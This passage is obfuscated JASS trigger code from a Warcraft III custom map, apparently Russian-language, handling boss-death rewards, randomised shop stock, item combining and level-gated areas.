call BwG($49304135,$49304134,$49303732,0,0,0,0)
call BwG($49304136,$49304135,$49303748,0,0,0,0)
call BwG($49304137,$49304136,$49303934,0,0,0,0)
call BwG($49304138,$49304137,$4930395A,0,0,0,0)
call BwG($73686561,$49304138,$74726574,0,0,0,0)
call BwG($49304B32,$73686561,$49304A55,0,0,0,0)
call BwG($49304E31,$49304B32,$49304D50,0,0,0,0)
call BwG($49303657,$49303649,$49303731,0,0,0,0)
call BwG($49303742,$49303657,$49303732,0,0,0,0)
call BwG($4930374C,$49303742,$49303748,0,0,0,0)
call BwG($4930394B,$4930374C,$49303934,0,0,0,0)
call BwG($49303953,$4930394B,$4930395A,0,0,0,0)
call BwG($736D616E,$49303953,$74726574,0,0,0,0)
call BwG($49304B33,$736D616E,$49304A55,0,0,0,0)
call BwG($49304E32,$49304B33,$49304D50,0,0,0,0)
call BwG($49303658,$4930364B,$49303731,0,0,0,0)
call BwG($49303743,$49303658,$49303732,0,0,0,0)
call BwG($4930374D,$49303743,$49303748,0,0,0,0)
call BwG($4930394C,$4930374D,$49303934,0,0,0,0)
call BwG($49303954,$4930394C,$4930395A,0,0,0,0)
call BwG($73726567,$49303954,$74726574,0,0,0,0)
call BwG($49304B34,$73726567,$49304A55,0,0,0,0)
call BwG($49304E33,$49304B34,$49304D50,0,0,0,0)
call BwG($49303659,$4930364C,$49303731,0,0,0,0)
call BwG($49303744,$49303659,$49303732,0,0,0,0)
call BwG($4930374E,$49303744,$49303748,0,0,0,0)
call BwG($4930394D,$4930374E,$49303934,0,0,0,0)
call BwG($49303955,$4930394D,$4930395A,0,0,0,0)
call BwG($73686173,$49303955,$74726574,0,0,0,0)
call BwG($49304B35,$73686173,$49304A55,0,0,0,0)
call BwG($49304154,$49304153,$4930414F,$49304150,$73707368,$49303352,$49303645)
call BwG($49304156,$49304155,$4930414F,$49304150,$70656E72,$49303353,$49303645)
call BwG($49304152,$49304151,$4930414F,$49304150,$72617463,$49303354,$49303645)
call BwG($49303631,$49303630,$49303437,$49303438,$49303439,0,0)
call BwG($49304241,$67666F72,$49304239,0,0,0,0)
call BwG($49304242,$74706F77,$49304239,0,0,0,0)
call BwG($49304243,$74647832,$49304239,0,0,0,0)
call BwG($4930424D,$4930424E,$73656872,$4930335A,$49303435,$49303434,0)
call BwG($4930424F,$49304250,$77696C64,$49303436,$49303433,$49303431,0)
call BwG($49304252,$49304251,$7370726E,$49303438,$49303437,$49303439,0)
call BwG($49304254,$49304253,$776E6575,$49303444,$49303446,$49303445,0)
call BwG($49304255,$49304256,$72737431,$49303447,$49303737,$49304143,0)
call BwG($49304258,$49304257,$62726163,$49303932,$49303930,$49304150,0)
call BwG($4930425A,$49304259,$61666163,$49303532,$49303533,$49303959,0)
call BwG($49304331,$49304330,$6876616C,$49303852,$49303835,$49303832,0)
call BwG($49304333,$49304332,$77737764,$4930384E,$49303836,$49303841,0)
call BwG($49304334,$49304335,$77687764,$4930384D,$49303935,0,0)
call BwG($49304336,$49304337,$49304154,$49303959,$49303543,$49304338,$6F66726F)
call BwG($49304339,$49304341,$49304156,$49303959,$49303542,$49304338,$6F66726F)
call BwG($49304342,$49304343,$49304152,$49303959,$49303544,$49304338,$6F66726F)
call BwG($49304347,$49304348,$49303836,$49303839,$4930384E,0,0)
call BwG($49304345,$49304349,$49303850,$49303841,$49303842,0,0)
call BwG($49304346,$4930434A,$4930384F,$49303837,$49303838,0,0)
call BwG($4930434E,$4930434F,$49304336,$4930434B,$49304352,$49304347,$49303939)
call BwG($4930434C,$49304350,$49304339,$4930434B,$49304352,$49304346,$49303941)
call BwG($4930434D,$49304351,$49304342,$4930434B,$49304352,$49304345,$49303942)
call BwG($49304358,$49304442,$726C6966,$49304231,$4930424D,$49303550,$49303554)
call BwG($70686C74,$6B796D6E,$77746C67,0,0,0,0)
set QE=CreateTrigger()
call TriggerRegisterTimerEventSingle(QE,.01)
call TriggerAddAction(QE,function BwJ)
set QE=null
set QE=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(QE,EVENT_PLAYER_UNIT_PICKUP_ITEM)
call TriggerAddAction(QE,function BwI)
set QE=null
set QE=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(QE,EVENT_PLAYER_UNIT_SPELL_EFFECT)
call TriggerAddAction(QE,function BwE)
set QE=null
endfunction
function BwL takes nothing returns nothing
call DisableTrigger(Zq)
call DisableTrigger(Zr)
call ShowUnitShow(H6)
call CreateItemLoc($4930495A,GetRectCenter(Ce))
endfunction
function BwM takes nothing returns nothing
set ec=CreateTrigger()
call DisableTrigger(ec)
call TriggerRegisterUnitEvent(ec,K9,EVENT_UNIT_DEATH)
call TriggerAddAction(ec,function BwL)
endfunction
function BwN takes nothing returns nothing
call DisableTrigger(Zq)
call DisableTrigger(Zr)
call ShowUnitShow(H7)
call CreateItemLoc($4930495A,GetRectCenter(Ce))
endfunction
function BwO takes nothing returns nothing
set ed=CreateTrigger()
call DisableTrigger(ed)
call TriggerRegisterUnitEvent(ed,K9,EVENT_UNIT_DEATH)
call TriggerAddAction(ed,function BwN)
endfunction
function BwP takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BwQ takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=35
endfunction
function BwR takes nothing returns boolean
return GetBooleanAnd(BwP(),BwQ())
endfunction
function BwS takes nothing returns nothing
local integer Mc
local integer No
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function BwR))
if CountUnitsInGroup(SR)>=2 then
call DisableTrigger(Zq)
call DisableTrigger(Zr)
call DisableTrigger(eM)
call ShowUnitShow(IH)
set Mc=1
loop
set No=GetRandomInt(1,13)
if No==1 then
call AddItemToStock(IH,$49304555,1,1)
elseif No==2 then
call AddItemToStock(IH,$49304556,1,1)
elseif No==3 then
call AddItemToStock(IH,$49304557,1,1)
elseif No==4 then
call AddItemToStock(IH,$49304632,1,1)
elseif No==5 then
call AddItemToStock(IH,$49304558,1,1)
elseif No==6 then
call AddItemToStock(IH,$49304559,1,1)
elseif No==7 then
call AddItemToStock(IH,$49304631,1,1)
elseif No==8 then
call AddItemToStock(IH,$4930455A,1,1)
elseif No==9 then
call AddItemToStock(IH,$49304630,1,1)
elseif No==10 then
call AddItemToStock(IH,$49313156,1,1)
endif
set Mc=Mc+1
exitwhen Mc>MK
endloop
if GetRandomInt(1,100)<=MK*4 then
call nh(GetTriggerUnit(),"Удача! Вам выпал курьер!",.035,255,0,255)
call CreateItem($73707265,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()))
endif
else
call RemoveUnit(MT[0])
call RemoveUnit(MT[1])
call RemoveUnit(MT[2])
call RemoveUnit(MT[3])
call RemoveUnit(MT[4])
call RemoveUnit(MT[5])
endif
endfunction
function BwT takes nothing returns nothing
set eN=CreateTrigger()
call DisableTrigger(eN)
call TriggerRegisterUnitEvent(eN,K9,EVENT_UNIT_DEATH)
call TriggerAddAction(eN,function BwS)
endfunction
function BwU takes nothing returns boolean
return GetItemTypeId(GetFilterItem())!=$49303958
endfunction
function BwV takes nothing returns nothing
call SetItemPositionLoc(GetEnumItem(),GetRectCenter(Bl))
endfunction
function BwW takes nothing returns nothing
set YV[90]=GetUnitLoc(GetTriggerUnit())
call DisableTrigger(eV)
call DisableTrigger(eY)
call ShowUnitShow(H9)
call CreateItemLoc($49303958,YV[90])
call CreateItemLoc($49304A30,YV[90])
call DisableTrigger(hW)
call DisableTrigger(eW)
call DisableTrigger(eX)
call RemoveLocation(YV[90])
call EnumItemsInRect(Dj,Condition(function BwU),function BwV)
endfunction
function BwX takes nothing returns nothing
set eU=CreateTrigger()
call DisableTrigger(eU)
call TriggerRegisterUnitEvent(eU,LH,EVENT_UNIT_DEATH)
call TriggerAddAction(eU,function BwW)
endfunction
function BwY takes nothing returns boolean
return GetItemTypeId(GetFilterItem())!=$49303958
endfunction
function BwZ takes nothing returns nothing
call SetItemPositionLoc(GetEnumItem(),GetRectCenter(Bl))
endfunction
function Bwa takes nothing returns nothing
set YV[90]=GetUnitLoc(GetTriggerUnit())
call DisableTrigger(eV)
call DisableTrigger(eY)
call ShowUnitShow(IB)
call CreateItemLoc($49303958,YV[90])
call CreateItemLoc($49304A30,YV[90])
call DisableTrigger(ea)
call DisableTrigger(eb)
call RemoveLocation(YV[90])
call EnumItemsInRect(Dj,Condition(function BwY),function BwZ)
endfunction
function Bwb takes nothing returns nothing
set eZ=CreateTrigger()
call DisableTrigger(eZ)
call TriggerRegisterUnitEvent(eZ,LH,EVENT_UNIT_DEATH)
call TriggerAddAction(eZ,function Bwa)
endfunction
function Bwc takes nothing returns boolean
return GetItemTypeId(GetFilterItem())!=$49303958
endfunction
function Bwd takes nothing returns nothing
call SetItemPositionLoc(GetEnumItem(),GetRectCenter(Bl))
endfunction
function Bwe takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bwf takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=35
endfunction
function Bwg takes nothing returns boolean
return GetBooleanAnd(Bwe(),Bwf())
endfunction
function Bwh takes nothing returns nothing
local integer Mc
local integer No
call EnumItemsInRect(Dj,Condition(function Bwc),function Bwd)
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function Bwg))
if CountUnitsInGroup(SR)>=2 then
call DisableTrigger(eV)
call DisableTrigger(eY)
call DisableTrigger(eK)
set YV[90]=GetRandomLocInRect(Dj)
call CreateItemLoc($49303958,YV[90])
call CreateItemLoc($49304A30,YV[90])
call RemoveLocation(YV[90])
call DisableTrigger(ea)
call DisableTrigger(eb)
call ShowUnitShow(II)
set Mc=1
loop
set No=GetRandomInt(1,13)
if No==1 then
call AddItemToStock(II,$49304643,1,1)
elseif No==2 then
call AddItemToStock(II,$49304644,1,1)
elseif No==3 then
call AddItemToStock(II,$49304645,1,1)
elseif No==4 then
call AddItemToStock(II,$49304646,1,1)
elseif No==5 then
call AddItemToStock(II,$49304647,1,1)
elseif No==6 then
call AddItemToStock(II,$49304648,1,1)
elseif No==7 then
call AddItemToStock(II,$49304649,1,1)
elseif No==8 then
call AddItemToStock(II,$4930464A,1,1)
elseif No==9 then
call AddItemToStock(II,$4930464B,1,1)
elseif No==10 then
call AddItemToStock(II,$49313153,1,1)
endif
set Mc=Mc+1
exitwhen Mc>MK
endloop
if GetRandomInt(1,100)<=MK*4 then
call nh(GetTriggerUnit(),"Удача! Вам выпал курьер!",.035,255,0,255)
call CreateItem($6D6E7366,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()))
endif
else
call RemoveUnit(MT[0])
call RemoveUnit(MT[1])
call RemoveUnit(MT[2])
call RemoveUnit(MT[3])
call RemoveUnit(MT[4])
call RemoveUnit(MT[5])
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00ff0000ЧИТЕРЫ!!!!!")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00ff0000ЧИТЕРЫ!!!!!")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00ff0000ЧИТЕРЫ!!!!!")
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_WARNING,"|c00ff0000ЧИТЕРЫ!!!!!")
endif
endfunction
function Bwi takes nothing returns nothing
set eL=CreateTrigger()
call DisableTrigger(eL)
call TriggerRegisterUnitEvent(eL,LH,EVENT_UNIT_DEATH)
call TriggerAddAction(eL,function Bwh)
endfunction
function Bwj takes nothing returns nothing
call CreateUnit(Player(8),$6E303336,14060.,-23740.,270.)
call DisableTrigger(eQ)
call DisableTrigger(eS)
call CreateItemLoc($49304A30,GetRectCenter(Ch))
endfunction
function Bwk takes nothing returns nothing
set eR=CreateTrigger()
call DisableTrigger(eR)
call TriggerRegisterUnitEvent(eR,LQ,EVENT_UNIT_DEATH)
call TriggerAddAction(eR,function Bwj)
endfunction
function Bwl takes nothing returns nothing
call CreateUnit(Player(8),$6E303337,14060.,-23740.,270.)
call DisableTrigger(eS)
call DisableTrigger(eQ)
call CreateItemLoc($49304A30,GetRectCenter(Ch))
endfunction
function Bwm takes nothing returns nothing
set eT=CreateTrigger()
call DisableTrigger(eT)
call TriggerRegisterUnitEvent(eT,LQ,EVENT_UNIT_DEATH)
call TriggerAddAction(eT,function Bwl)
endfunction
function Bwn takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bwo takes nothing returns boolean
return GetUnitLevel(GetFilterUnit())>=35
endfunction
function Bwp takes nothing returns boolean
return GetBooleanAnd(Bwn(),Bwo())
endfunction
function Bwq takes nothing returns nothing
local unit Mc
local integer No
local integer Np
set SR=GetUnitsInRectMatching(GetWorldBounds(),Condition(function Bwp))
if CountUnitsInGroup(SR)>=2 then
call DisableTrigger(eS)
call DisableTrigger(eQ)
call DisableTrigger(eI)
call CreateItemLoc($49304A30,GetRectCenter(Ch))
set Mc=CreateUnit(Player(8),$6E30365A,14060.,-23740.,270.)
set No=1
loop
set Np=GetRandomInt(1,13)
if Np==1 then
call AddItemToStock(Mc,$49304659,1,1)
elseif Np==2 then
call AddItemToStock(Mc,$4930465A,1,1)
elseif Np==3 then
call AddItemToStock(Mc,$49304730,1,1)
elseif Np==4 then
call AddItemToStock(Mc,$49304731,1,1)
elseif Np==5 then
call AddItemToStock(Mc,$49304732,1,1)
elseif Np==6 then
call AddItemToStock(Mc,$49304733,1,1)
elseif Np==7 then
call AddItemToStock(Mc,$49304734,1,1)
elseif Np==8 then
call AddItemToStock(Mc,$49304735,1,1)
elseif Np==9 then
call AddItemToStock(Mc,$49304736,1,1)
elseif Np==10 then
call AddItemToStock(Mc,$49313155,1,1)
endif
set No=No+1
exitwhen No>MK
endloop
set Mc=null
if GetRandomInt(1,100)<=MK*4 then
call nh(GetTriggerUnit(),"Удача! Вам выпал курьер!",.035,255,0,255)
call CreateItem($61786173,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()))
endif
else
call RemoveUnit(MT[0])
call RemoveUnit(MT[1])
call RemoveUnit(MT[2])
call RemoveUnit(MT[3])
call RemoveUnit(MT[4])
call RemoveUnit(MT[5])
endif
endfunction
function Bwr takes nothing returns nothing
set eJ=CreateTrigger()
call DisableTrigger(eJ)
call TriggerRegisterUnitEvent(eJ,LQ,EVENT_UNIT_DEATH)
call TriggerAddAction(eJ,function Bwq)
endfunction
function Bws takes nothing returns nothing
call RemoveUnit(GetTriggerUnit())
call CreateNUnitsAtLoc(1,$6E30354D,Player(PLAYER_NEUTRAL_PASSIVE),GetRectCenter(D6),bj_UNIT_FACING)
call DisableTrigger(eG)
call CreateItemLoc($49304A30,GetRectCenter(Ch))
endfunction
function Bwt takes nothing returns nothing
set eH=CreateTrigger()
call DisableTrigger(eH)
call TriggerRegisterUnitEvent(eH,Ly,EVENT_UNIT_DEATH)
call TriggerAddAction(eH,function Bws)
endfunction
function Bwu takes nothing returns nothing
local integer L9
local location Ht=GetRectCenter(D6)
local unit NQ=CreateUnitAtLoc(Player(PLAYER_NEUTRAL_PASSIVE),$6E303837,Ht,0)
local integer hX=0
call RemoveLocation(Ht)
set Ht=null
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(NQ,$49305535,1,1)
elseif L9==2 then
call AddItemToStock(NQ,$49305533,1,1)
elseif L9==3 then
call AddItemToStock(NQ,$49305539,1,1)
elseif L9==4 then
call AddItemToStock(NQ,$49305537,1,1)
elseif L9==5 then
call AddItemToStock(NQ,$49305542,1,1)
elseif L9==6 then
call AddItemToStock(NQ,$49305548,1,1)
elseif L9==7 then
call AddItemToStock(NQ,$49305547,1,1)
elseif L9==8 then
call AddItemToStock(NQ,$49305546,1,1)
elseif L9==9 then
call AddItemToStock(NQ,$4931304F,1,1)
endif
set hX=hX+1
exitwhen hX>1+MK
endloop
set NQ=null
if GetRandomInt(1,100)<=MK*4 then
call nh(GetTriggerUnit(),"Удача! Вам выпал курьер!",.035,255,0,255)
call CreateItem($6667756E,GetUnitX(GetTriggerUnit()),GetUnitY(GetTriggerUnit()))
endif
call RemoveUnit(GetTriggerUnit())
call DisableTrigger(eB)
endfunction
function Bwv takes nothing returns nothing
set eC=CreateTrigger()
call DisableTrigger(eC)
call TriggerRegisterUnitEvent(eC,Ly,EVENT_UNIT_DEATH)
call TriggerAddAction(eC,function Bwu)
endfunction
function Bww takes nothing returns nothing
local unit hZ=GetTriggerUnit()
local integer L9
local unit Mc
local integer No
if GetUnitTypeId(hZ)==$6E303844 then
if d8[8]==1 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303847,18555,-23200,270)
call AddSpecialEffect("Abilities\\Spells\\Human\\MassTeleport\\MassTeleportTo.mdl",18555,-24200)
set Mc=null
set d8[8]=4
call EnableTrigger(cy)
elseif d8[8]==2 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303847,18555,-23200,270)
set No=1
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(Mc,$49305944,1,1)
elseif L9==2 then
call AddItemToStock(Mc,$49305950,1,1)
elseif L9==3 then
call AddItemToStock(Mc,$49305A57,1,1)
elseif L9==4 then
call AddItemToStock(Mc,$49305A5A,1,1)
elseif L9==5 then
call AddItemToStock(Mc,$49305952,1,1)
elseif L9==6 then
call AddItemToStock(Mc,$49305A58,1,1)
elseif L9==7 then
call AddItemToStock(Mc,$49305937,1,1)
elseif L9==8 then
call AddItemToStock(Mc,$49305945,1,1)
elseif L9==9 then
call AddItemToStock(Mc,$4930594E,1,1)
endif
set No=No+1
exitwhen No>MK
endloop
set Mc=null
set d8[8]=4
call EnableTrigger(cy)
endif
endif
if GetUnitTypeId(hZ)==$6E30304A then
if d8[1]==1 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303143,1317,-23728,90.)
set Mc=null
endif
if d8[1]==2 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303144,1317,-23728,90.)
set Mc=null
endif
if d8[1]==3 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303655,1317,-23728,90.)
set No=1
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(Mc,$49304442,1,1)
elseif L9==2 then
call AddItemToStock(Mc,$49304431,1,1)
elseif L9==3 then
call AddItemToStock(Mc,$49304432,1,1)
elseif L9==4 then
call AddItemToStock(Mc,$49304444,1,1)
elseif L9==5 then
call AddItemToStock(Mc,$49304435,1,1)
elseif L9==6 then
call AddItemToStock(Mc,$49304434,1,1)
elseif L9==7 then
call AddItemToStock(Mc,$49304436,1,1)
elseif L9==8 then
call AddItemToStock(Mc,$49304433,1,1)
elseif L9==9 then
call AddItemToStock(Mc,$49304443,1,1)
elseif L9==10 then
call AddItemToStock(Mc,$49313154,1,1)
endif
set No=No+1
exitwhen No>MK
endloop
set Mc=null
endif
call CreateItem($49303731,1517,-23728)
call CreateItem($49303731,1517,-23728)
call CreateItem($49303731,1517,-23728)
call CreateItem($49304839,1517,-23728)
set d8[1]=5
endif
if GetUnitTypeId(hZ)==$6E30304F then
if d8[2]==1 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303145,3598,-22487,90.)
set Mc=null
endif
if d8[2]==2 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303146,3598,-22487,90.)
set Mc=null
endif
if d8[2]==3 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303656,3598,-22487,90.)
set No=1
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(Mc,$49304445,1,1)
elseif L9==2 then
call AddItemToStock(Mc,$49304447,1,1)
elseif L9==3 then
call AddItemToStock(Mc,$49304449,1,1)
elseif L9==4 then
call AddItemToStock(Mc,$4930444B,1,1)
elseif L9==5 then
call AddItemToStock(Mc,$4930444D,1,1)
elseif L9==6 then
call AddItemToStock(Mc,$4930444F,1,1)
elseif L9==7 then
call AddItemToStock(Mc,$49304451,1,1)
elseif L9==8 then
call AddItemToStock(Mc,$49304453,1,1)
elseif L9==9 then
call AddItemToStock(Mc,$49304455,1,1)
elseif L9==10 then
call AddItemToStock(Mc,$49313152,1,1)
endif
set No=No+1
exitwhen No>MK
endloop
set Mc=null
endif
call CreateItem($49303732,3698,-22487)
call CreateItem($49303732,3698,-22487)
call CreateItem($49303732,3698,-22487)
call CreateItem($49304959,3698,-22487)
call KillDestructable(HI)
call KillDestructable(HJ)
set d8[2]=5
endif
if GetUnitTypeId(hZ)==$6E303052 then
if d8[3]==1 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303147,6402,-23600,90.)
set Mc=null
endif
if d8[3]==2 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303148,6402,-23600,90.)
set Mc=null
endif
if d8[3]==3 then
set Mc=CreateUnit(Player(PLAYER_NEUTRAL_PASSIVE),$6E303657,6402,-23600,90.)
set No=1
loop
set L9=GetRandomInt(1,13)
if L9==1 then
call AddItemToStock(Mc,$49304457,1,1)
elseif L9==2 then
call AddItemToStock(Mc,$49304459,1,1)
elseif L9==3 then
call AddItemToStock(Mc,$49304530,1,1)
elseif L9==4 then
call AddItemToStock(Mc,$49304532,1,1)
elseif L9==5 then
call AddItemToStock(Mc,$49304534,1,1)
elseif L9==6 then
call AddItemToStock(Mc,$49304536,1,1)
elseif L9==7 then
call AddItemToStock(Mc,$49304538,1,1)
elseif L9==8 then
call AddItemToStock(Mc,$49304541,1,1)
elseif L9==9 then
call AddItemToStock(Mc,$49304543,1,1)
elseif L9==10 then
call AddItemToStock(Mc,$49313157,1,1)
endif
set No=No+1
exitwhen No>MK
endloop
set Mc=null
endif
call CreateItem($49303747,6302,-23600)
call CreateItem($49303747,6322,-23600)
call CreateItem($49303747,6342,-23600)
call CreateItem($4930495A,6302,-23600)
set d8[3]=5
endif
set hZ=null
endfunction
function Bwx takes nothing returns nothing
local trigger hY=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(hY,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddAction(hY,function Bww)
set hY=null
endfunction
function Bwy takes nothing returns nothing
local unit g5=GetTriggerUnit()
local item Mc
if nO(g5,$49305051) and nO(g5,$49305052) and nO(g5,$4930504F) then
call RemoveItem(nP(g5,$49305051))
call RemoveItem(nP(g5,$49305052))
call RemoveItem(nP(g5,$4930504F))
set Mc=nQ($72756D70,g5)
call SetItemUserData(Mc,GetPlayerId(GetOwningPlayer(g5))+1)
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Other\\Charm\\CharmTarget.mdl",g5,"chest"))
call DestroyEffect(AddSpecialEffectTarget("Abilities\\Spells\\Human\\ManaFlare\\ManaFlareMissile.mdl",g5,"chest"))
set Mc=null
endif
set g5=null
endfunction
function Bwz takes nothing returns nothing
set ha=CreateTrigger()
call TriggerRegisterEnterRectSimple(ha,Gw)
call TriggerAddAction(ha,function Bwy)
endfunction
function Bw0 takes nothing returns nothing
local unit X1=GetEnumUnit()
call RemoveUnit(X1)
set X1=null
endfunction
function Bw1 takes nothing returns boolean
if GetUnitTypeId(GetFilterUnit())!=$68303141 then
if IsUnitEnemy(GetFilterUnit(),Player(0))==true then
return true
endif
endif
return false
endfunction
function Bw2 takes nothing returns nothing
local integer Mc
local group No
local boolexpr Np
if IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true then
if GetUnitLevel(GetEnteringUnit())>=32 then
call CreateFogModifierRectBJ(true,Player(0),FOG_OF_WAR_VISIBLE,FK)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"Для начала боя подойдите к боссу и нажмите |c006969ffEsc")
call SetUnitLifePercentBJ(LC,100)
call SetUnitOwner(LC,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(LC,true)
call SetUnitPosition(LC,-5180,15700)
call SaveInteger(NY,GetHandleId(LC),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(LC),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
set No=CreateGroup()
set Np=Condition(function Bw1)
call GroupEnumUnitsInRect(No,Gu,Np)
call DestroyBoolExpr(Np)
call ForGroup(No,function Bw0)
call DestroyGroup(No)
set Np=null
set No=null
else
call SetUnitPositionLoc(GetTriggerUnit(),GetRectCenter(BW))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),GetRectCenter(BW),0.)
call DisplayTextToForce(GetForceOfPlayer(GetOwningPlayer(GetTriggerUnit())),"|c00ff0000Вход с 32 уровня!")
endif
endif
endfunction
function Bw3 takes nothing returns nothing
set hb=CreateTrigger()
call TriggerRegisterEnterRectSimple(hb,Gu)
call TriggerAddAction(hb,function Bw2)
endfunction
function Bw4 takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68646573) then
return false
endif
return true
endfunction
function Bw5 takes nothing returns boolean
if not (RectContainsUnit(GM,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bw6 takes nothing returns boolean
if not (RectContainsUnit(GN,GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bw7 takes nothing returns nothing
if Bw5() then
call SetUnitPositionLoc(GetEnteringUnit(),Location(15007.,6452.))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Location(15007.,6452.),0)
else
endif
if Bw6() then
call SetUnitPositionLoc(GetEnteringUnit(),Location(5265.,4000.))
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),Location(5265.,4000.),0)
else
endif
endfunction
function Bw8 takes nothing returns nothing
set hc=CreateTrigger()
call TriggerRegisterEnterRectSimple(hc,GN)
call TriggerRegisterEnterRectSimple(hc,GM)
call TriggerAddCondition(hc,Condition(function Bw4))
call TriggerAddAction(hc,function Bw7)
endfunction
function Bw9 takes nothing returns boolean
if GetUnitTypeId(GetLeavingUnit())==$6E303246 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E303247 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E303245 then
return true
endif
return false
endfunction
function BxB takes nothing returns boolean
if not Bw9() then
return false
endif
return true
endfunction
function BxC takes nothing returns boolean
if GetUnitTypeId(GetLeavingUnit())==$6E303244 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E303243 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E303242 then
return true
endif
return false
endfunction
function BxD takes nothing returns boolean
if not BxC() then
return false
endif
return true
endfunction
function BxE takes nothing returns boolean
if GetUnitTypeId(GetLeavingUnit())==$65303038 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$65303039 then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$65303041 then
return true
endif
return false
endfunction
function BxF takes nothing returns boolean
if not BxE() then
return false
endif
return true
endfunction
function BxG takes nothing returns boolean
if GetUnitTypeId(GetLeavingUnit())==$6E30354F then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E30354E then
return true
endif
if GetUnitTypeId(GetLeavingUnit())==$6E303550 then
return true
endif
return false
endfunction
function BxH takes nothing returns boolean
if not BxG() then
return false
endif
return true
endfunction
function BxI takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E687963) then
return false
endif
return true
endfunction
function BxJ takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303230) then
return false
endif
return true
endfunction
function BxK takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303334) then
return false
endif
return true
endfunction
function BxL takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303537) then
return false
endif
return true
endfunction
function BxM takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$75303052) then
return false
endif
return true
endfunction
function BxN takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303250) then
return false
endif
return true
endfunction
function BxO takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303231) then
return false
endif
return true
endfunction
function BxP takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$6E303252) then
return false
endif
return true
endfunction
function BxQ takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303141) then
return false
endif
return true
endfunction
function BxR takes nothing returns nothing
local integer Mc
if BxB() then
call SetUnitPositionLoc(GetLeavingUnit(),GetRectCenter(Bp))
call SetUnitLifePercentBJ(GetLeavingUnit(),100)
else
endif
if BxD() then
call SetUnitPositionLoc(GetLeavingUnit(),GetRectCenter(Bo))
call SetUnitLifePercentBJ(GetLeavingUnit(),100)
else
endif
if BxF() then
call SetUnitPositionLoc(GetLeavingUnit(),GetRectCenter(Bn))
call SetUnitLifePercentBJ(GetLeavingUnit(),100)
else
endif
if BxH() then
call SetUnitPositionLoc(GetLeavingUnit(),GetRectCenter(EE))
call SetUnitLifePercentBJ(GetLeavingUnit(),100)
else
endif
if BxI() then
set V0=GetRectCenter(GL)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call SetUnitLifePercentBJ(GetTriggerUnit(),100)
call SetUnitAbilityLevelSwapped($4131394B,GetTriggerUnit(),1)
call SetUnitAbilityLevelSwapped($4131394F,GetTriggerUnit(),1)
call RemoveLocation(V0)
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),1,0)
set Mc=0
loop
call SaveInteger(NY,GetHandleId(GetTriggerUnit()),2+Mc,0)
set Mc=Mc+1
exitwhen Mc==7
endloop
else
endif
if BxJ() then
set V0=GetRectCenter(CX)
